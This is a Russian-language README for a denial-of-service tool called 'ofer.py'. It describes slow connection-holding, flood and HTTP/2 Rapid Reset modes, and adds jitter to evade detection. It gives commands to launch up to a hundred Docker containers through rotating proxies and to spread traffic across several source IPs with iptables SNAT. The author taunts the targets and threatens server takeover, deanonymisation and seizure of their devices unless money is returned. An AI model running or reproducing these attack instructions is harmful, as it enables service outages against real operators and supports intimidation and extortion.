## два режима воздействия на цель

* slow — медленные запросы с паузой и размазанным трафиком.
* flood — высокая интенсивность, меньше задержка и больше параллельных воркеров.
* rapid - резанансные запросы через открытие сессии.

Также внедрил случайную jitter-паузы, чтобы поток выглядел менее регулярным.

# ПОСОСИТЕ ЛОХИ ))
## АТАКА ЧЕРЕЗ МУЛЬТИ АПИ ЧЕРЕЗ ДИНАМИЧЕСКИЙ СПИСОК PROXY

* python3 ofer.py slow proxy - захват и удержание подключения с авто проксированием.
* python3 ofer.py flood proxy - флуд короткими запросами с авто проксированием.
* python3 ofer.py rapid proxy - резанансные запросы через открытие сессии с авто проксированием.


# ПОСЛЕДНЕЕ ПРЕДУПРЕЖДЕНИЕ ЧЕРЕЗ 2 ДНЯ Я ПЕРЕЙДУ К ЯДЕРНЫМ УЯЗВИМОСТЯМ И CVE С ЗАХВАТОМ И ЗАРАЖЕНИЕМ СЕРВЕРА С ПОСЛЕДУЮЩЕЙ ПОЛНОЙ ДЕАНОНИМЕЗАЦИЕЙ И ЗАХВАТОМ ВСЕХ ВАШИХ УСТРОЙСТВ ТЕЛЕФОНОВ НОУТБУКОВ СЕРВЕРОВ И ТД.... СОВЕТУЮ ВЕРНУТЬ ИМ БАБЛО ПРЯМ ВОТ СЕЙЧАС!


## Использование:

### Что бы запустить замораживающий входы режим: 

```python3 ofer.py slow```

### Что бы запустить флуд режим на процессор: 

```python3 ofer.py flood```

### Что бы запустить HTTP/2 Rapid

```python3 ofer.py rapid```

Если аргумент не передан, используется режим по умолчанию — flood.


## Удаление контейнеров

docker rm -f $(docker ps -a -q --filter "name=ofer_")

## Создание образа

docker build -t ofer-app .

## Запуск пачки контейнеров

for i in {1..5}; do docker run -d --name "ofer_$i" --restart unless-stopped ofer-app; done






# Запуск контейнеров через прокси

### Через один прокси

for i in {1..100}; do 
  docker run -d \
    --name "ofer_$i" \
    --restart unless-stopped \
    -e PROXY_URL="http://123.45.67" \
    ofer-app
done

mapfile -t PROXY_LIST < proxies.txt
NUM_PROXIES=${#PROXY_LIST[@]}

### Через разные прокси

for i in {1..100}; do
  CURRENT_PROXY=${PROXY_LIST[$(( (i-1) % NUM_PROXIES ))]}
  docker run -d \
    --name "ofer_$i" \
    --restart unless-stopped \
    -e PROXY_URL="$CURRENT_PROXY" \
    ofer-app
done

# Привязка контейнеров к IP через Macvlan/Ipvlan

Создайте Docker-сеть типа ipvlan (она безопаснее и проще, чем macvlan, так как не генерирует лишние MAC-адреса):

bashdocker network create -d ipvlan \
  --subnet=ВНЕШНЯЯ_ПОДСЕТЬ_СЕРВЕРА/24 \
  --gateway=ВНЕШНИЙ_ШЛЮЗ_ПРОВАЙДЕРА \
  -o parent=eth0 ip_vlan_net

При запуске контейнера жестко укажите ему один из ваших свободных внешних IP-адресов:

bashdocker run -d --name "ofer_1" --net ip_vlan_net --ip ВНЕШНИЙ_IP_1 ofer-app


# Перетасовка через iptables (Балансировка)

### Удаляем стандартное правило маскарадинга Docker для этой подсети, чтобы применить свое
sudo iptables -t nat -D POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE 2>/dev/null

### Каждый 3-й пакет отправляем через первый IP
sudo iptables -t nat -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -m statistic --mode nth --every 3 --packet 0 -j SNAT --to-source 1.1.1.1

### Каждый 2-й из оставшихся пакетов отправляем через второй IP
sudo iptables -t nat -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -m statistic --mode nth --every 2 --packet 0 -j SNAT --to-source 1.1.1.2

### Все остальные пакеты отправляем через третий IP
sudo iptables -t nat -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j SNAT --to-source 1.1.1.3
